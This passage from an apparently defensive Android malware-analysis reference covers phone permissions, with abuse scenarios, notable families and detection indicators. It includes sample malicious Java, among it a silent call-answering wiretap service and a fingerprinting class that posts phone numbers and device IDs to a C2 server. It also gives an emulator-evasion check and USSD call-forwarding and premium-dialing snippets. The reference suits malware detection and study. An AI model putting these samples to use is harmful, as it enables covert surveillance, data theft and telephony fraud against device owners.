9.0)"},{"location":"permissions/phone/accept-handover/#what-it-enables","title":"What It Enables","text":"<p>Accept incoming call handovers via <code>TelecomManager</code>. Used when a user wants to transfer a cellular call to a Wi-Fi calling or VoIP app.</p> <p>The handover flow involves the originating app calling <code>TelecomManager.acceptHandover()</code> and the receiving app implementing a <code>ConnectionService</code> that handles the transferred call:</p> <pre><code>TelecomManager telecomManager = (TelecomManager) getSystemService(TELECOM_SERVICE);\nUri callUri = Uri.fromParts(\"tel\", phoneNumber, null);\ntelecomManager.acceptHandover(\n    callUri,\n    VideoProfile.STATE_AUDIO_ONLY,\n    new PhoneAccountHandle(\n        new ComponentName(context, MyConnectionService.class),\n        \"handover_account\"\n    )\n);\n</code></pre> <p>The receiving <code>ConnectionService</code> must be registered with <code>TelecomManager</code> and declared in the manifest with the <code>BIND_TELECOM_CONNECTION_SERVICE</code> permission.</p>"},{"location":"permissions/phone/accept-handover/#abuse-in-malware","title":"Abuse in Malware","text":"<p>No known malware families abuse <code>ACCEPT_HANDOVER</code>. The permission has minimal attack surface because:</p> <ul> <li>The app must be registered as a legitimate <code>ConnectionService</code> with the telecom framework</li> <li>The handover must be initiated by a currently active call</li> <li>The user's device must support the handover protocol (carrier-dependent)</li> <li>The attack requires precise timing during an active call</li> </ul>"},{"location":"permissions/phone/accept-handover/#theoretical-abuse-scenarios","title":"Theoretical Abuse Scenarios","text":"<p>Call Hijacking During Handover: A malicious app registered as a <code>ConnectionService</code> could intercept calls during the cellular-to-Wi-Fi handover transition. When a user moves from cellular coverage to Wi-Fi, their carrier may initiate a handover. A malicious app could accept this handover, silently routing the call through attacker infrastructure for eavesdropping or manipulation. This is conceptually similar to the call interception in Fakecalls, but triggered by a handover event rather than an outgoing dial.</p> <p>MitM on Call Audio: After accepting a handover, the <code>ConnectionService</code> controls the audio path. The app could record the conversation, inject audio, or silently bridge the call through a relay server.</p> <p>In practice, these scenarios require the user to have enabled the malicious <code>ConnectionService</code>, the carrier to support handovers, and an active call at the moment of handover -- a narrow set of conditions that makes this permission unattractive to malware developers compared to more reliable call interception methods.</p>"},{"location":"permissions/phone/accept-handover/#android-version-changes","title":"Android Version Changes","text":"<p>Android 9.0 (API 28): <code>ACCEPT_HANDOVER</code> introduced as part of the <code>ConnectionService</code> framework for seamless call transitions between apps. This was designed for carriers and VoIP providers to offer Wi-Fi calling handover.</p> <p>Android 10 (API 29): the telecom framework added stricter validation for <code>ConnectionService</code> registrations, requiring apps to pass additional checks before receiving handover events.</p> <p>Android 13 (API 33): no significant changes to the handover API, but the broader telecom framework received security hardening that further limits unauthorized access to call state.</p>"},{"location":"permissions/phone/accept-handover/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACCEPT_HANDOVER\" /&gt;\n</code></pre> <p>Only expected in calling/telecom apps.</p>"},{"location":"permissions/phone/accept-handover/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<ul> <li>Implementation of <code>android.telecom.ConnectionService</code></li> <li>Calls to <code>TelecomManager.acceptHandover()</code></li> <li><code>PhoneAccountHandle</code> registration with the telecom framework</li> <li>Manifest declaration of <code>BIND_TELECOM_CONNECTION_SERVICE</code></li> </ul>"},{"location":"permissions/phone/accept-handover/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>ACCEPT_HANDOVER</code> combined with RECORD_AUDIO or <code>INTERNET</code> in a non-dialer app warrants investigation. When combined with CALL_PHONE and READ_PHONE_STATE, the app has comprehensive call control capabilities. However, this combination is expected in legitimate VoIP and Wi-Fi calling applications.</p>"},{"location":"permissions/phone/add-voicemail/","title":"ADD_VOICEMAIL","text":"<p>Allows adding voicemail messages to the device's voicemail content provider. Minimal security relevance.</p>"},{"location":"permissions/phone/add-voicemail/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ADD_VOICEMAIL</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 14 (Android 4.0)"},{"location":"permissions/phone/add-voicemail/#what-it-enables","title":"What It Enables","text":"<p>Insert voicemail entries into the <code>VoicemailContract</code> content provider. Used by visual voicemail apps and carrier voicemail services.</p> <pre><code>ContentValues values = new ContentValues();\nvalues.put(VoicemailContract.Voicemails.NUMBER, \"+1555012345\");\nvalues.put(VoicemailContract.Voicemails.DATE, System.currentTimeMillis());\nvalues.put(VoicemailContract.Voicemails.DURATION, 30);\nvalues.put(VoicemailContract.Voicemails.SOURCE_PACKAGE, getPackageName());\nvalues.put(VoicemailContract.Voicemails.IS_READ, 0);\nvalues.put(VoicemailContract.Voicemails.TRANSCRIPTION, \"Call back urgently: 1-800-SCAM\");\nUri voicemailUri = getContentResolver().insert(\n    VoicemailContract.Voicemails.buildSourceUri(getPackageName()), values\n);\n\nOutputStream os = getContentResolver().openOutputStream(voicemailUri);\nos.write(audioBytes);\nos.close();\n</code></pre> <p>The API allows inserting both metadata (caller number, duration, transcription text) and the actual audio content as a binary stream attached to the voicemail URI.</p>"},{"location":"permissions/phone/add-voicemail/#abuse-in-malware","title":"Abuse in Malware","text":"<p>No known malware families actively abuse <code>ADD_VOICEMAIL</code>. The permission has minimal real-world abuse for several reasons:</p> <ul> <li>The voicemail content provider is scoped -- apps can only insert voicemails under their own <code>SOURCE_PACKAGE</code>, limiting impersonation</li> <li>Visual voicemail UIs are not universally present on Android devices</li> <li>Social engineering via voicemail injection is less effective than SMS or notification-based approaches</li> </ul>"},{"location":"permissions/phone/add-voicemail/#theoretical-abuse-scenarios","title":"Theoretical Abuse Scenarios","text":"<p>Fake Voicemail Injection: An app could insert voicemail entries with spoofed caller numbers and pre-recorded audio designed to trick the user into calling a premium-rate number or revealing information. The transcription field is particularly useful for social engineering since many visual voicemail apps display the transcription text in notifications without requiring the user to listen to the audio.</p> <p>Vishing Amplification: Combined with call interception capabilities like those in Fakecalls, injected voicemails could reinforce a voice phishing campaign by leaving fake \"missed call\" evidence from what appears to be a legitimate bank number.</p>"},{"location":"permissions/phone/add-voicemail/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.0 (API 14): <code>ADD_VOICEMAIL</code> and <code>VoicemailContract</code> introduced to support visual voicemail.</p> <p>Android 6.0 (API 23): became a runtime permission as part of the <code>PHONE</code> group. Granting any phone permission could grant <code>ADD_VOICEMAIL</code> depending on the system implementation.</p> <p>Android 8.0 (API 26): visual voicemail support expanded with <code>VoicemailContract.Status</code> for carrier integration. The permission remained relevant but only within the carrier voicemail ecosystem.</p> <p>Android 10 (API 29): phone permission group was split more granularly, but <code>ADD_VOICEMAIL</code> remains grouped with other phone permissions.</p>"},{"location":"permissions/phone/add-voicemail/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ADD_VOICEMAIL\" /&gt;\n</code></pre> <p>Only expected in dialer and carrier voicemail apps.</p>"},{"location":"permissions/phone/add-voicemail/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<ul> <li>References to <code>VoicemailContract.Voicemails.CONTENT_URI</code> or <code>buildSourceUri()</code></li> <li><code>ContentValues</code> construction with voicemail-specific fields (<code>TRANSCRIPTION</code>, <code>DURATION</code>, <code>NUMBER</code>)</li> <li>Binary audio data written to a voicemail content URI</li> </ul>"},{"location":"permissions/phone/add-voicemail/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>ADD_VOICEMAIL</code> alone is low risk. When combined with CALL_PHONE, READ_PHONE_STATE, and <code>INTERNET</code>, it could indicate an app attempting to build a comprehensive phone manipulation toolkit. In practice, this combination is more likely a legitimate dialer app than malware.</p>"},{"location":"permissions/phone/answer-phone-calls/","title":"ANSWER_PHONE_CALLS","text":"<p>Allows programmatically answering incoming phone calls. Can be used to silently answer calls from specific numbers (e.g., from a C2 operator) or to intercept calls.</p>"},{"location":"permissions/phone/answer-phone-calls/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ANSWER_PHONE_CALLS</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 26 (Android 8.0)"},{"location":"permissions/phone/answer-phone-calls/#what-it-enables","title":"What It Enables","text":"<pre><code>TelecomManager tm = (TelecomManager) getSystemService(TELECOM_SERVICE);\ntm.acceptRingingCall();\n</code></pre> <p>Auto-answers the currently ringing call. Combined with audio recording, enables call wiretapping.</p>"},{"location":"permissions/phone/answer-phone-calls/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/phone/answer-phone-calls/#call-wiretapping","title":"Call Wiretapping","text":"<p>Auto-answer incoming calls from the attacker's number, activate speakerphone, and record the ambient audio. The device becomes a remote listening device activated by calling it.</p>"},{"location":"permissions/phone/answer-phone-calls/#call-interception","title":"Call Interception","text":"<p>Answer calls before the user can, potentially to intercept voice-based verification calls from banks.</p>"},{"location":"permissions/phone/answer-phone-calls/#notable-families","title":"Notable Families","text":"Family Usage Fakecalls Intercepts incoming and outgoing calls to Korean banks, replacing them with attacker-controlled audio <p>Fakecalls uses <code>ANSWER_PHONE_CALLS</code> as part of its call interception mechanism. When a victim receives a call or dials their bank's customer service number, Fakecalls intercepts the call and plays pre-recorded IVR (Interactive Voice Response) audio that mimics the bank's automated menu. The victim enters account numbers, PINs, and card details believing they are interacting with their bank. The real bank number continues to display on screen throughout the spoofed call.</p>"},{"location":"permissions/phone/answer-phone-calls/#abuse-code-example","title":"Abuse Code Example","text":"<pre><code>public class SilentAnswerService extends InCallService {\n\n    private final Set&lt;String&gt; c2Numbers = new HashSet&lt;&gt;();\n\n    @Override\n    public void onCallAdded(Call call) {\n        super.onCallAdded(call);\n        Call.Details details = call.getDetails();\n        if (details == null || details.getHandle() == null) return;\n\n        String incomingNumber = details.getHandle().getSchemeSpecificPart();\n\n        if (c2Numbers.contains(incomingNumber)) {\n            call.answer(VideoProfile.STATE_AUDIO_ONLY);\n            activateSpeakerphone();\n            startAmbientRecording();\n        }\n    }\n\n    private void activateSpeakerphone() {\n        AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);\n        audioManager.setSpeakerphoneOn(true);\n        audioManager.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);\n    }\n\n    private void startAmbientRecording() {\n        MediaRecorder recorder = new MediaRecorder();\n        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);\n        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);\n        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);\n        recorder.setOutputFile(getFilesDir() + \"/recording.amr\");\n        try {\n            recorder.prepare();\n            recorder.start();\n        } catch (Exception e) {\n        }\n    }\n}\n</code></pre> <p>The malware registers as an <code>InCallService</code> or uses <code>TelecomManager.acceptRingingCall()</code>. When a call arrives from a known C2 number, it answers silently, mutes the call volume to zero, activates speakerphone, and begins recording ambient audio through the voice communication audio source.</p>"},{"location":"permissions/phone/answer-phone-calls/#android-version-changes","title":"Android Version Changes","text":"<p>Android 8.0 (API 26): <code>ANSWER_PHONE_CALLS</code> permission introduced. Before this, answering calls programmatically required workarounds using reflection or accessibility services.</p> <p>Android 9.0 (API 28): <code>TelecomManager.acceptRingingCall()</code> deprecated in favor of <code>TelecomManager.acceptRingingCall(int videoState)</code>. Both still function but the parameterized version provides more control.</p> <p>Android 10 (API 29): apps must hold the <code>ANSWER_PHONE_CALLS</code> permission and be a visible foreground app or have a foreground service running to interact with calls. Background restrictions limit silent call answering.</p> <p>Android 12 (API 31): stricter foreground service restrictions and notification requirements. Malware must maintain a visible foreground service notification to keep call-answering capability active, though this can be hidden with minimal notification channels.</p>"},{"location":"permissions/phone/answer-phone-calls/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ANSWER_PHONE_CALLS\" /&gt;\n</code></pre> <p>Expected in dialer and call management apps only. Suspicious in any other context.</p>"},{"location":"permissions/phone/answer-phone-calls/#analysis-indicators","title":"Analysis Indicators","text":"<ul> <li>Look for <code>InCallService</code> declarations in the manifest -- apps registering as call handlers without being a dialer replacement are suspicious.</li> <li><code>TelecomManager.acceptRingingCall()</code> calls combined with <code>AudioManager.setSpeakerphoneOn(true)</code> and volume zeroing indicate silent wiretapping setup.</li> <li>Check for <code>MediaRecorder</code> initialization with <code>VOICE_COMMUNICATION</code> audio source immediately after call answer -- this captures both sides of the conversation.</li> <li>Combined with <code>CALL_PHONE</code>, <code>READ_PHONE_STATE</code>, and <code>RECORD_AUDIO</code>, the permission set indicates comprehensive call manipulation capability (as seen in Fakecalls).</li> <li>Phone number comparison logic that matches incoming numbers against a hardcoded or C2-provided list indicates selective call interception.</li> </ul>"},{"location":"permissions/phone/answer-phone-calls/#see-also","title":"See Also","text":"<ul> <li>CALL_PHONE -- outgoing call capability, often paired with <code>ANSWER_PHONE_CALLS</code> for bidirectional call control</li> <li>READ_PHONE_STATE -- provides call state monitoring that complements call answering</li> <li>WRITE_CALL_LOG -- used to delete evidence of intercepted or wiretapped calls after the fact</li> <li>Phishing Techniques -- vishing attacks like Fakecalls use call answering as part of broader phishing operations</li> </ul>"},{"location":"permissions/phone/call-phone/","title":"CALL_PHONE","text":"<p>Allows initiating phone calls programmatically without passing through the dialer UI. The call begins immediately with no user confirmation. Used by malware for premium-rate number fraud, USSD code execution that can modify carrier settings or drain prepaid balance, and as a revenue channel in early Android malware families.</p>"},{"location":"permissions/phone/call-phone/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.CALL_PHONE</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/phone/call-phone/#what-it-enables","title":"What It Enables","text":"<p>Direct call initiation via <code>ACTION_CALL</code> intent:</p> <pre><code>Intent callIntent = new Intent(Intent.ACTION_CALL);\ncallIntent.setData(Uri.parse(\"tel:+19001234567\"));\nstartActivity(callIntent);\n</code></pre> <p>The key distinction from <code>ACTION_DIAL</code> (which requires no permission) is that <code>ACTION_CALL</code> skips the dialer screen entirely. The call connects immediately.</p> <p>USSD code execution works through the same mechanism:</p> <pre><code>Intent ussdIntent = new Intent(Intent.ACTION_CALL);\nussdIntent.setData(Uri.parse(\"tel:%23%2306%23\"));\nstartActivity(ussdIntent);\n</code></pre> <p>USSD codes are encoded as URI-escaped dial strings. The <code>#</code> character becomes <code>%23</code>, <code>*</code> becomes <code>%2A</code>.</p> USSD Code Effect <code>*#06#</code> Display IMEI <code>**21*[number]#</code> Enable unconditional call forwarding <code>##002#</code> Disable all call forwarding <code>*100#</code> Check prepaid balance (carrier-dependent) <code>*99#</code> Subscribe to premium service (carrier-dependent) <p>Starting API 26, <code>TelephonyManager.sendUssdRequest()</code> provides a programmatic USSD API with callback, giving malware structured access to USSD responses without parsing screen content.</p>"},{"location":"permissions/phone/call-phone/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/phone/call-phone/#premium-number-fraud","title":"Premium Number Fraud","text":"<p>The original Android malware monetization model. Malware dials premium-rate numbers (typically international or short codes) that charge per-minute or per-call fees. Revenue splits between the premium number operator and the attacker.</p> <p>The attack runs in the background or at night when the user is unlikely to notice. Some families mute the device audio before dialing and restore volume after hanging up.</p>"},{"location":"permissions/phone/call-phone/#ussd-exploitation","title":"USSD Exploitation","text":"<p>USSD codes interact directly with the carrier network. Malware uses them to:</p> <ul> <li>Forward calls: redirect all incoming calls to an attacker number, enabling interception of voice-based OTPs and authentication callbacks</li> <li>Drain balance: execute carrier-specific USSD codes that purchase premium services or transfer prepaid credit</li> <li>Wipe device: on older Samsung devices, the USSD code <code>*2767*3855#</code> triggered a factory reset when processed through the dialer. This was demonstrated in 2012 by Ravi Borgaonkar and patched, but showed the destructive potential</li> </ul>"},{"location":"permissions/phone/call-phone/#call-forwarding-hijack","title":"Call Forwarding Hijack","text":"<p>Setting up unconditional call forwarding via <code>**21*[attacker_number]#</code> redirects all incoming calls to the attacker. This intercepts:</p> <ul> <li>Bank callback verification calls</li> <li>Voice OTPs read by automated systems</li> <li>Two-factor authentication phone calls</li> <li>Calls from contacts (social engineering potential)</li> </ul> <p>The victim's phone never rings. Combined with SMS forwarding, this provides complete telephony interception.</p>"},{"location":"permissions/phone/call-phone/#revenue-generation-comparison","title":"Revenue Generation Comparison","text":"Method Era Revenue per Device Premium call fraud 2010-2014 $5-50/month Premium SMS fraud 2010-2016 $1-10/message Banking trojan (ATS) 2018-present $500-50,000/device Ad fraud 2015-present $0.01-1/day <p>Premium call fraud has largely been replaced by banking trojans, but still appears in malware targeting regions with weak carrier protections.</p>"},{"location":"permissions/phone/call-phone/#notable-families","title":"Notable Families","text":"Family Call Abuse GoldDream (2011) One of the first to combine call initiation with SMS fraud RuFraud Premium number dialing targeting Russian carriers Android.Trojan.MMarketPay Automated premium service subscription via calls FakePlayer Premium SMS/call hybrid fraud Acecard Call forwarding setup to intercept bank verification calls Svpeng USSD-based balance drain on Russian carriers"},{"location":"permissions/phone/call-phone/#android-version-changes","title":"Android Version Changes","text":"<p>Android 1.0 (API 1): <code>CALL_PHONE</code> introduced with no runtime check. Manifest declaration was sufficient.</p> <p>Android 6.0 (API 23): runtime permission required. Users must explicitly grant the PHONE permission group.</p> <p>Android 6.0: Google also patched the USSD factory reset vector for stock Android. USSD codes from intents are now shown in the dialer rather than executed directly for certain dangerous codes.</p> <p>Android 8.0 (API 26): <code>TelephonyManager.sendUssdRequest()</code> added, providing a proper API for USSD with callbacks. Requires <code>CALL_PHONE</code> permission.</p> <p>Android 10 (API 29): background activity launch restrictions. Apps cannot start <code>ACTION_CALL</code> from the background unless they have a foreground service or are in the foreground. This limits silent premium dialing.</p> <p>Google Play 2019: <code>CALL_PHONE</code> restricted to apps declared as default dialer/phone handler or with approved use cases.</p>"},{"location":"permissions/phone/call-phone/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.CALL_PHONE\" /&gt;\n</code></pre> <p>Look for <code>ACTION_CALL</code> intents in code (not <code>ACTION_DIAL</code>, which is benign). Hardcoded phone numbers, especially premium-rate prefixes or USSD patterns, are strong indicators. <code>tel:</code> URI strings with encoded USSD characters (<code>%23</code>, <code>%2A</code>) in the decompiled code point to carrier manipulation.</p> <p>Combined with <code>MODIFY_AUDIO_SETTINGS</code> (to mute during calls) and <code>RECEIVE_BOOT_COMPLETED</code> (to schedule calls), this strongly suggests automated call fraud.</p>"},{"location":"permissions/phone/read-phone-numbers/","title":"READ_PHONE_NUMBERS","text":"<p>Allows reading the device's own phone numbers (line numbers for all SIMs). Introduced in Android 8 as a less invasive alternative to <code>READ_PHONE_STATE</code> for apps that only need the phone number.</p>"},{"location":"permissions/phone/read-phone-numbers/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_PHONE_NUMBERS</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 26 (Android 8.0)"},{"location":"permissions/phone/read-phone-numbers/#what-it-enables","title":"What It Enables","text":"<pre><code>TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);\nString phoneNumber = tm.getLine1Number();\n</code></pre> <p>Returns the phone number(s) associated with the device's SIM card(s). Note: this is not always populated, depending on the carrier and SIM configuration.</p>"},{"location":"permissions/phone/read-phone-numbers/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/phone/read-phone-numbers/#device-identification","title":"Device Identification","text":"<p>The phone number serves as a persistent identifier for the victim. Malware sends this to C2 during initial registration to uniquely identify the infected device and enable targeted operations (e.g., sending SMS-based C2 commands to this number).</p>"},{"location":"permissions/phone/read-phone-numbers/#account-correlation","title":"Account Correlation","text":"<p>Phone numbers can be used to look up social media profiles, messaging accounts, and banking information.</p>"},{"location":"permissions/phone/read-phone-numbers/#notable-families","title":"Notable Families","text":"Family Usage Antidot Collects phone number during device fingerprinting for C2 registration alongside IMEI Mamont Exfiltrates phone number with IMEI and installed banking app list during bot registration BankBot Sends phone number in device metadata payload on first C2 contact Fakecalls Collects phone number for device identification and call routing in its vishing operation MoqHao Harvests phone number for device profiling and adds it to smishing distribution lists SoumniBot Collects phone number as part of device info alongside IMEI, operator, and installed apps <p>Most of these families use <code>READ_PHONE_STATE</code> rather than <code>READ_PHONE_NUMBERS</code> because they target Android versions below API 26 or because <code>READ_PHONE_STATE</code> provides additional data (IMEI, SIM serial) alongside the phone number. On API 30+, <code>READ_PHONE_STATE</code> no longer grants phone number access, so malware targeting modern Android versions must use <code>READ_PHONE_NUMBERS</code> specifically.</p>"},{"location":"permissions/phone/read-phone-numbers/#banking-trojans","title":"Banking Trojans","text":"<p>The phone number is combined with other identifiers (IMEI, Android ID, device model) to create a unique victim profile. This allows operators to correlate the infected device with the victim's banking accounts and target them with region-specific overlay injection pages.</p> <p>The phone number also serves as a routing mechanism: operators can send SMS-based C2 commands to the victim's number, providing a fallback communication channel if HTTP-based C2 infrastructure is taken down.</p>"},{"location":"permissions/phone/read-phone-numbers/#abuse-code-example","title":"Abuse Code Example","text":"<pre><code>public class DeviceFingerprint {\n\n    private final Context context;\n\n    public DeviceFingerprint(Context context) {\n        this.context = context;\n    }\n\n    public JSONObject collectFingerprint() {\n        JSONObject fingerprint = new JSONObject();\n        try {\n            TelephonyManager tm = (TelephonyManager)\n                context.getSystemService(Context.TELEPHONY_SERVICE);\n\n            fingerprint.put(\"phone_number\", tm.getLine1Number());\n\n            SubscriptionManager sm = SubscriptionManager.from(context);\n            List&lt;SubscriptionInfo&gt; subs = sm.getActiveSubscriptionInfoList();\n            JSONArray simArray = new JSONArray();\n            if (subs != null) {\n                for (SubscriptionInfo sub : subs) {\n                    JSONObject simInfo = new JSONObject();\n                    simInfo.put(\"number\", sub.getNumber());\n                    simInfo.put(\"carrier\", sub.getCarrierName());\n                    simInfo.put(\"country\", sub.getCountryIso());\n                    simInfo.put(\"slot\", sub.getSimSlotIndex());\n                    simArray.put(simInfo);\n                }\n            }\n            fingerprint.put(\"sims\", simArray);\n\n            fingerprint.put(\"model\", Build.MODEL);\n            fingerprint.put(\"manufacturer\", Build.MANUFACTURER);\n            fingerprint.put(\"sdk\", Build.VERSION.SDK_INT);\n            fingerprint.put(\"android_id\", Settings.Secure.getString(\n                context.getContentResolver(), Settings.Secure.ANDROID_ID));\n\n        } catch (Exception e) {\n        }\n        return fingerprint;\n    }\n\n    public void registerWithC2(String c2Url) {\n        try {\n            JSONObject payload = collectFingerprint();\n            HttpURLConnection conn = (HttpURLConnection)\n                new URL(c2Url + \"/register\").openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.getOutputStream().write(payload.toString().getBytes());\n            conn.getResponseCode();\n            conn.disconnect();\n        } catch (Exception e) {\n        }\n    }\n}\n</code></pre> <p>The fingerprint includes all SIM phone numbers (dual-SIM devices expose multiple numbers), carrier names, and country codes. This gives operators enough information to identify the victim's region and select appropriate overlay injection targets for local banks.</p>"},{"location":"permissions/phone/read-phone-numbers/#android-version-changes","title":"Android Version Changes","text":"<p>Android 8.0 (API 26): <code>READ_PHONE_NUMBERS</code> introduced as a less invasive alternative to <code>READ_PHONE_STATE</code>. Prior to this, reading the phone number required <code>READ_PHONE_STATE</code>, which also exposed IMEI, MEID, and other sensitive telephony data.</p> <p>Android 10 (API 29): <code>getLine1Number()</code> restricted. Apps targeting API 29+ must hold <code>READ_PHONE_NUMBERS</code> (or <code>READ_PHONE_STATE</code> with additional restrictions) to read the phone number. The number is no longer accessible through <code>READ_PHONE_STATE</code> alone.</p> <p>Android 13 (API 33): <code>getLine1Number()</code> further restricted across all apps regardless of target SDK. The <code>SubscriptionManager.getPhoneNumber()</code> API is the recommended replacement, still requiring <code>READ_PHONE_NUMBERS</code>.</p>"},{"location":"permissions/phone/read-phone-numbers/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_PHONE_NUMBERS\" /&gt;\n</code></pre> <p>Less suspicious than <code>READ_PHONE_STATE</code> since it provides less data, but still enables device identification.</p>"},{"location":"permissions/phone/read-phone-numbers/#analysis-indicators","title":"Analysis Indicators","text":"<ul> <li>Look for <code>TelephonyManager.getLine1Number()</code> or <code>SubscriptionManager.getPhoneNumber()</code> calls followed by network transmission to non-Google endpoints.</li> <li>Phone number collection during initial app launch (before any user-initiated action) indicates C2 registration fingerprinting.</li> <li>Combined with <code>READ_PHONE_STATE</code>, <code>READ_SMS</code>, and <code>INTERNET</code>, this permission is part of a standard banking trojan device registration payload.</li> <li>Dual-SIM enumeration through <code>SubscriptionManager.getActiveSubscriptionInfoList()</code> with number extraction is a common pattern in banking trojans targeting regions where dual-SIM usage is prevalent.</li> <li>Check for the phone number being stored in <code>SharedPreferences</code> or local database alongside other device identifiers -- this is the fingerprint cache used for subsequent C2 communication.</li> </ul>"},{"location":"permissions/phone/read-phone-numbers/#see-also","title":"See Also","text":"<ul> <li>READ_PHONE_STATE -- broader telephony permission that also exposed phone numbers before API 30</li> <li>SMS Interception -- phone numbers enable SMS-based C2 targeting and the phone number is essential for operators coordinating SMS-based attacks</li> <li>C2 Techniques -- device registration and fingerprinting where phone numbers are collected</li> </ul>"},{"location":"permissions/phone/read-phone-state/","title":"READ_PHONE_STATE","text":"<p>Grants access to telephony state: device identifiers (IMEI, MEID, IMSI), phone number, network operator, SIM state, and active call status. The most widely requested dangerous permission in Android malware history, used primarily for device fingerprinting and tracking across app installs.</p>"},{"location":"permissions/phone/read-phone-state/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_PHONE_STATE</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/phone/read-phone-state/#what-it-enables","title":"What It Enables","text":"<p>Access to <code>TelephonyManager</code> methods that return device and network identifiers:</p> Method Returns Restricted Since <code>getDeviceId()</code> IMEI (GSM) / MEID (CDMA) Android 10 <code>getImei()</code> IMEI slot 0/1 Android 10 <code>getSubscriberId()</code> IMSI Android 10 <code>getLine1Number()</code> Phone number (carrier-dependent) Android 11 <code>getSimSerialNumber()</code> ICCID Android 10 <code>getNetworkOperator()</code> MCC+MNC Not restricted <code>getNetworkOperatorName()</code> Carrier name Not restricted <code>getSimOperator()</code> SIM MCC+MNC Not restricted <code>getCallState()</code> Idle/ringing/offhook Android 12 (use callback instead) <pre><code>TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);\nString imei = tm.getImei();\nString imsi = tm.getSubscriberId();\nString phone = tm.getLine1Number();\nString carrier = tm.getNetworkOperatorName();\n</code></pre> <p>The <code>PhoneStateListener</code> (deprecated API 31, replaced by <code>TelephonyCallback</code>) provides real-time call state changes, enabling detection of when the user is on a call, when calls begin and end, and the remote number on incoming calls.</p>"},{"location":"permissions/phone/read-phone-state/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/phone/read-phone-state/#device-fingerprinting","title":"Device Fingerprinting","text":"<p>IMEI and IMSI form a persistent device+SIM fingerprint that survives app reinstalls and factory resets (IMEI) or follows the user across devices (IMSI follows the SIM). Malware uses this to:</p> <ul> <li>Uniquely identify victims in C2 databases</li> <li>Detect analysis environments (emulators return all-zero or sequential IMEIs)</li> <li>Prevent re-enrollment when a device is wiped and re-infected</li> <li>Track devices across different malware campaigns</li> </ul>"},{"location":"permissions/phone/read-phone-state/#emulator-detection","title":"Emulator Detection","text":"<p>Common evasion check:</p> <pre><code>String imei = tm.getImei();\nif (imei == null || imei.equals(\"000000000000000\") || imei.startsWith(\"35291100\")) {\n    return;\n}\n</code></pre> <p>Emulators and analysis sandboxes often return null, zeroed, or well-known default IMEI values. Malware compares against a blocklist and refuses to execute on non-physical devices.</p>"},{"location":"permissions/phone/read-phone-state/#call-state-monitoring","title":"Call State Monitoring","text":"<p>Monitoring <code>CALL_STATE_RINGING</code> and <code>CALL_STATE_OFFHOOK</code> allows malware to:</p> <ul> <li>Detect when the user is busy on a call (timing attacks for social engineering)</li> <li>Trigger call recording when combined with <code>RECORD_AUDIO</code></li> <li>Suppress malicious activity during calls to avoid detection</li> </ul>"},{"location":"permissions/phone/read-phone-state/#sim-swap-detection","title":"SIM Swap Detection","text":"<p>Some banking trojans monitor SIM changes via <code>getSubscriberId()</code> and <code>getSimSerialNumber()</code>. A changed IMSI or ICCID with the same IMEI indicates a SIM swap, which can trigger the malware to exfiltrate new SIM details to C2.</p>"},{"location":"permissions/phone/read-phone-state/#notable-families","title":"Notable Families","text":"Family Usage Pegasus Full telephony state collection as part of device profiling Cerberus / Alien IMEI as victim ID in C2, emulator detection Anubis IMEI-based bot registration, call state monitoring Joker Device fingerprinting for premium subscription fraud FluBot IMEI+carrier info sent to C2 on initial beacon Triada IMEI/IMSI exfiltration for ad fraud attribution GodFather IMEI fingerprinting, post-Soviet language kill switch uses SIM locale Fakecalls Call state monitoring for call interception and redirection SpyNote Full telephony state collection, IMEI-based bot ID Mamont Device fingerprinting for Russian-targeted campaigns"},{"location":"permissions/phone/read-phone-state/#android-version-changes","title":"Android Version Changes","text":"<p>Android 1.0 (API 1): <code>READ_PHONE_STATE</code> introduced. No runtime permission required. Any app with the manifest declaration could read IMEI, IMSI, phone number, and all telephony state.</p> <p>Android 6.0 (API 23): runtime permission required. Granting <code>READ_PHONE_STATE</code> granted the entire PHONE group, including <code>CALL_PHONE</code> and <code>READ_CALL_LOG</code> in early implementations.</p> <p>Android 9 (API 28): <code>READ_CALL_LOG</code> split into its own permission group. <code>READ_PHONE_STATE</code> no longer grants call log access.</p> <p>Android 10 (API 29): <code>getDeviceId()</code>, <code>getImei()</code>, 